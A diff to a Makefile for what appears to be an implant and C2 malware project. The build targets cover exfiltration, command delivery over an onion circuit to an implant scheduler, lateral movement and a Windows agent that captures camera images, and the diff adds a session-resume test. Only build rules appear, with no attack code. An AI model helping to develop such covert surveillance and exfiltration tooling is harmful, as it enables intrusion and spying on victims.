@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -72,6 +72,13 @@ $(BUILD)/task_link.o: src/task_link.c include/exfil_task_link.h include/exfil_ta
 
 # 端到端：C2 命令经**真实洋葱电路**（3 跳真进程）下行 -> 落到植入体调度器
 # -> 回执原路返回。含篡改/错密钥/重放/超长声明取证。
+# 重连恢复接进真实洋葱电路：断开 -> 重建电路 -> 用恢复点续用会话。
+# 含"计数归零 => IV 重用 => 必须 AUTH"的反证用例。
+$(BUILD)/test_task_resume: tests/test_task_resume.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
+	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
+	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+
 $(BUILD)/test_task_circuit: tests/test_task_circuit.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
 	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
